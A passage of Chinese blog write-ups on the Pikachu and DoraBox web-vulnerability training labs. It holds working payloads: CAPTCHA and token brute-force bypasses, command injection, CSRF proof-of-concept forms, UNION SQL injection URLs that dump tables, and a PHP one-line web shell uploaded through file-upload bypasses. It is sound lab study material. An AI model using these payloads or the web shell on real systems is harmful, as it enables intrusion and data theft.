admin。</p>\n<p>​\t根据提示，发现有三个账号：</p>\n<ul>\n<li>admin</li>\n<li>pikachu</li>\n<li>test</li>\n</ul>\n<p>前两个应该直接猜到的，最后一个还没见过，不过涨姿势了，应该都是常用账户名。</p>\n<p>想了想，用 bp 同时爆破用户名和密码（就是速度太慢了）：</p>\n<p><img src=\"pikachu-baopo-003.png\" alt=\"pikachu-baopo-003\"></p>\n<p>pitchfork 也可以啊</p>\n<p><img src=\"pikachu-baopo-001.png\" alt=\"pikachu-baopo-001\"></p>\n<p>这是给第二个参数设置字典，你这个猪<img src=\"pikachu-baopo-002.png\" alt=\"pikachu-baopo-002\"></p>\n<h2 id=\"验证码绕过on-server\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-server\">#</a> 验证码绕过（on server）</h2>\n<h3 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h3>\n<p>看抓的包，发现把用户输入的验证码和用户名密码一起发到服务器了，而且在 cookie 里发现了验证码的值，所以判断是验证码绕过。</p>\n<p><img src=\"pikachu-baopo-004.png\" alt=\"\"></p>\n<p>基本过程：客户端发起请求 -&gt; 服务端响应并创建一个新的 SessionID 同时生成随机验证码，将验证码和 SessionID 一并返回给客户端 -&gt; 客户端提交验证码连同 SessionID 给服务端 -&gt; 服务端验证验证码同时销毁当前会话，返回给客户端结果。</p>\n<p>所以用 bp 拦截，不让页面刷新，就不会销毁会话，也不会更新验证码，就可以用 bp 爆破辣，在 cookie 中带固定的 sessionID 和固定的验证码字符串</p>\n<p><img src=\"pikachu-baopo-005.png\" alt=\"\"></p>\n<h2 id=\"验证码绕过on-client\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-client\">#</a> 验证码绕过（on client）</h2>\n<h3 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h3>\n<p>在前台找到了验证验证码的函数</p>\n<p><img src=\"pikachu-baopo-006.png\" alt=\"\"></p>\n<p>通过搜索函数名，定位执行函数的位置，把这个事件删掉，bp 抓包，发现有 vcode 参数，删掉删掉，直接爆破</p>\n<p>写完 token 发现也可自动化获取前端信息，进行爆破</p>\n<h2 id=\"token防爆\"><a class=\"markdownIt-Anchor\" href=\"#token防爆\">#</a> token 防爆</h2>\n<h3 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h3>\n<p>token 主要用来防御 csrf，而无法防止暴力破解。</p>\n<p>这是因为将一个随机产生的 token 加入请求之后，每次请求 token 都会改变。</p>\n<p>csrf 攻击者只能窃取受害者的 cookie 却不能伪造当次请求的 token，token 无法防止暴力破解的原因是 token 每次都会随页面返回到前端，攻击者只要想办法__自动化获得前端的 token__即可进行暴力破解攻击。</p>\n<p>option 中的 Grep -Extract: 这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的 token，关联到 payload 中进行暴力破解。</p>\n<p><img src=\"pikachu-baopo-007.png\" alt=\"\"></p>\n<p>这样就设置完毕了，需要注意的是 burp 的 Pichfork 爆破模式只能进行单线程的爆破，设置一下线程 1</p>\n<p><img src=\"pikachu-baopo-008.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-009.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-010.png\" alt=\"\"></p>\n<p>然后常规爆破就好了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p><strong>BurpSuite intruder attack-type 4 种爆破模式：</strong></p>\n<p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变</p>\n<p>Battering ram 多参数同时爆破，但用的是同一个字典</p>\n<p>Pichfork 多参数同时爆破，但用的是不同的字典</p>\n<p>Cluster bamb 多参数做笛卡尔乘积模式爆破</p>\n<p><a href=\"https://www.cnblogs.com/kllay/p/7136022.html\">bp 爆破各种类型解说</a></p>\n<p><a href=\"https://www.cnblogs.com/rnss/p/11233006.html\">token 看的这位大佬</a></p>\n<hr>\n<h1 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h1>\n<p><strong>漏洞概述</strong></p>\n<blockquote>\n<p>RCE（remote command/code execute）漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>\n<p>(搬一下皮卡丘哒，对这个不是很熟悉)</p>\n</blockquote>\n<p><strong>远程系统命令执行</strong></p>\n<blockquote>\n<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>\n比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上</p>\n<p>一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器</p>\n<p>现在很多的甲方企业都开始实施自动化运维，大量的系统操作会通过 &quot;自动化运维平台&quot; 进行操作。在这种平台上往往会出现远程系统命令执行的漏洞，不信的话现在就可以找你们运维部的系统测试一下，会有意想不到的 &quot;收获&quot;-_-</p>\n</blockquote>\n<p><strong>远程代码执行</strong></p>\n<blockquote>\n<p>同样的道理，因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。</p>\n<p>因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>\n<p>你可以通过 “RCE” 对应的测试栏目，来进一步的了解该漏洞。</p>\n</blockquote>\n<h2 id=\"exec-ping\"><a class=\"markdownIt-Anchor\" href=\"#exec-ping\">#</a> exec “ping”</h2>\n<h3 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h3>\n<p>post 方法，用火狐拦截重发，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipaddress=jsdlvfdsfger | C:\\Windows\\System32\\calc.exe&amp;submit=ping</span><br></pre></td></tr></table></figure>\n<p>成功弹出</p>\n<h2 id=\"execeval\"><a class=\"markdownIt-Anchor\" href=\"#execeval\">#</a> exec&quot;eval&quot;</h2>\n<h3 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h3>\n<p>随便输一串字符串 phpinfo ()，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parse error: syntax error, unexpected end of file in D:\\phpstudy_pro\\WWW\\pikachu\\vul\\rce\\rce_eval.php(19) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>\n<p>后来百度发现：</p>\n<blockquote>\n<p>php 的 eval 函数是用来把一段文字当作一段 php 的脚本来执行，这样做的好处是我们可以动态修改 php 执行的内容。</p>\n<p>今天想实现的功能是：根据从浏览器 get 到的数据，使用 eval () 执行不同的函数：<br>\nif(isset(_GET['step'])){\neval(_GET[‘step’]);<br>\n}else{<br>\ncontent='\\<a href=\"?step=getipall\">第一步：获取所有的ip地址\\</a>';\nmsg(content);<br>\n}</p>\n</blockquote>\n<p>注意，这个代码是有安全问题的，千万不要在生产环境中使用。</p>\n<p>运行以上代码，提示 “eval ()’d code on line 1”，根据提示来看是 eval 函数在执行的时候出错了。</p>\n<p>第一反应就是 google，结果得到的都是其他成品程序出现了这个错误。这时候还得去翻 php 手册，根据手册的描述：eval 所执行的字符串，也得必须满足 php 的语法要求，很明显我的字符串里面缺少了括号和最后的分号。</p>\n<p>所以满足语法规则，payload 更改为 phpinfo (); 即可</p>\n<p>这真的是白给</p>\n<hr>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>(1)  ;</p>\n<p>分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</p>\n<p>(2) ||</p>\n<p>逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</p>\n<p>(3) &amp;&amp;</p>\n<p>逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</p>\n<p>(4) |</p>\n<p>管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</p>\n<p>例 ls | grep *.txt</p>\n<hr>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"csrfget\"><a class=\"markdownIt-Anchor\" href=\"#csrfget\">#</a> csrf(get)</h2>\n<h3 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h3>\n<p>poc 在 bp 上抓 request 包，自动生成：</p>\n<p><img src=\"pikachu-csrf-001.png\" alt=\"\"></p>\n<p>poc，在里面修改你要改的值:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;12345678<span class=\"symbol\">&amp;#64;</span>&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发给用户点击按钮后跳转：</p>\n<p><img src=\"pikachu-csrf-002.png\" alt=\"\"></p>\n<p>修改成功</p>\n<h2 id=\"csrfpost\"><a class=\"markdownIt-Anchor\" href=\"#csrfpost\">#</a> csrf（post）</h2>\n<h3 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h3>\n<p>和 get 相比，就是 action 后面加了个 method=“POST”，然后就是一样的操作了</p>\n<p>poc：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"csrftoken没绕过去可以用bp绕把\"><a class=\"markdownIt-Anchor\" href=\"#csrftoken没绕过去可以用bp绕把\">#</a> csrf (token)（没绕过去？可以用 bp 绕把）</h2>\n<h3 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h3>\n<p>没绕过去，下面有个服务器给的隐藏的 token</p>\n<p>（这里可以利用 bp 自带的功能，将返回数据包中的 token 数据设置为下一请求数据包的参数）</p>\n<h3 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h3>\n<p>总结之不知道自己当时在想什么导致只能浑水摸鱼系列◔ ‸◔</p>\n<hr>\n<h2 id=\"最后想说的话\"><a class=\"markdownIt-Anchor\" href=\"#最后想说的话\">#</a> 最后想说的话</h2>\n<p>只要花时间去努力，真的会变强的！！！</p>\n<p>看见自己以前写的文章，莫名落泪</p>\n<p>。</p>\n<p>突然想接一个不明觉厉ヽ (✿ﾟ▽ﾟ) ノ</p>\n<p>突然伤感氛围打破</p>\n",
            "tags": [
                "pikachu,web靶场"
            ]
        },
        {
            "id": "http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "url": "http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "title": "dorabox冒险手记",
            "date_published": "2020-10-15T08:40:33.000Z",
            "content_html": "<h1 id=\"sqli字符型\"><a class=\"markdownIt-Anchor\" href=\"#sqli字符型\">#</a> SQLi 字符型</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程：</h2>\n<p>字符型和数字型相比，就是要闭合单引号吧</p>\n<ol>\n<li>\n<p>单引号闭合，# 用 url 编码 %23：</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src=\"dorabox_sqlchar002.png\" alt=\"\"></p>\n<p>下面就是和数字型注入相同的操作。</p>\n</li>\n<li>\n<p>利用 order by 或者 group by 判断字段数：</p>\n<p>正常： <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p>\n<p>报错： <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>\n?title=1’ or 1=1 order by 4 %23’<br>\n&amp;submit=submit</p>\n<p>以上说明需要 3 个字段</p>\n</li>\n<li>\n<p>爆该数据库所有表和 news 表有多少条数据</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p>\n<p>因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据<img src=\"dorabox_sqlchar003.png\" alt=\"\"></p>\n<p>注入的三个字段：</p>\n<ul>\n<li>\n<p>1 并不会输出，所以随意</p>\n</li>\n<li>\n<p>(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看</p>\n</li>\n<li>\n<p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名</p>\n</li>\n</ul>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar005.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h2>\n<p>在 sql 注入中，注释常用’–+’，而注释符’#‘和’–' 一般不能直接使用。</p>\n<ul>\n<li>‘#’：sql 手工注入时，浏览器地址栏输入的 '＃' 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行</li>\n<li>‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格</li>\n</ul>\n<h1 id=\"sqli搜索型\"><a class=\"markdownIt-Anchor\" href=\"#sqli搜索型\">#</a> SQLi 搜索型</h1>\n<p>类似字符型注入，主要就是闭合</p>\n<p><img src=\"dorabox_sqlss001.png\" alt=\"\"></p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>进行闭合</p>\n<p>‘<a href=\"http://localhost/dorabox/sql_injection/sql_search.php\">http://localhost/dorabox/sql_injection/sql_search.php</a><br>\n?content=’ or ‘%’=’<br>\n&amp;submit=submit’</p>\n<p><img src=\"dorabox_sqlss002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>判断需要的字段数 3 个（感觉这种方法有点低级）</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表，常规手段</p>\n<p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p>\n<p><img src=\"dorabox_sqlss004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>sql 通配符</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">通配符</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">%</td>\n<td style=\"text-align:left\">替代 0 个或多个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">_</td>\n<td style=\"text-align:left\">替代一个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[<em>charlist</em>]</td>\n<td style=\"text-align:left\">字符列中的任何单一字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>\n<td style=\"text-align:left\">不在字符列中的任何单一字符</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"js限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#js限制文件上传\">#</a> JS 限制文件上传</h1>\n<p>前端进行了文件名后缀过滤</p>\n<p><img src=\"dorabox_fp_js003.png\" alt=\"\"></p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程：</h2>\n<ol>\n<li>打开源代码，把蓝色框部分内容删除，即绕过验证函数<img src=\"dorabox_fp_js002.png\" alt=\"\"></li>\n<li>上传成功，路径告诉了，菜刀直连</li>\n</ol>\n<p><img src=\"dorabox_fp_js001.png\" alt=\"\"></p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结：</h2>\n<p>遇见了一个问题，还没有解决：</p>\n<p>为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？</p>\n<p>据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）</p>\n<h1 id=\"任意文件上传\"><a class=\"markdownIt-Anchor\" href=\"#任意文件上传\">#</a> 任意文件上传</h1>\n<p>随便传</p>\n<p><img src=\"dorabox_fp_all001.png\" alt=\"\"></p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程：</h2>\n<p>根据题目提示，获取到文件上传的路径，用菜刀直接连接</p>\n<p><img src=\"dorabox_fp_all002.png\" alt=\"\"></p>\n<p>上传的 php 一句话木马 attack.php：</p>\n<p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结：</h2>\n<ol>\n<li>\n<p>php 一句话木马基本原理：</p>\n<ul>\n<li>@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)</li>\n<li>eval () 函数，括号内的语句字符串什么的都当做代码执行</li>\n<li>$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack</li>\n</ul>\n</li>\n<li>\n<p>TruBW 博主举的常用的方法：</p>\n<blockquote>\n<p>你想查看目标硬盘里有没有小黄片，可以用 php 函数： <code>opendir()</code>  和 <code>readdir()</code>  等等。想上传点小黄片，诬陷站主，就用 php 函数： <code>move_uploaded_file</code> ，当然相应的 html 要写好。你想执行 cmd 命令，则用 <code>exec()</code> 。</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"mime限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#mime限制文件上传\">#</a> MIME 限制文件上传</h1>\n<p>.jpg 可以上传成功</p>\n<p><img src=\"dorabox_fp_mime001.png\" alt=\"\"></p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程：</h2>\n<ol>\n<li>打开网络抓包，把后缀修改为.php<img src=\"dorabox_fp_mime002.png\" alt=\"\"></li>\n<li>上传成功，菜刀直连<img src=\"dorabox_fp_mime003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h2>\n<p><strong>MIME 介绍：</strong></p>\n<blockquote>\n<p>MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）</p>\n</blockquote>\n<p><strong>常见的类型：</strong></p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>xhtml 文档</td>\n<td>.xhtml</td>\n<td>application/xhtml+xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>au 声音文件</td>\n<td>.au</td>\n<td>audio/basic</td>\n</tr>\n<tr>\n<td>MIDI 音乐文件</td>\n<td>mid,.midi</td>\n<td>audio/midi,audio/x-midi</td>\n</tr>\n<tr>\n<td>RealAudio 音乐</td>\n<td>.ra,.ram</td>\n<td>audio/x-pn-realaudio</td>\n</tr>\n<tr>\n<td>AVI 文件</td>\n<td>.avi</td>\n<td>video/x-msvideo</td>\n</tr>\n<tr>\n<td>GZIP 文件</td>\n<td>.gz</td>\n<td>application/x-gzip</td>\n</tr>\n<tr>\n<td>TAR 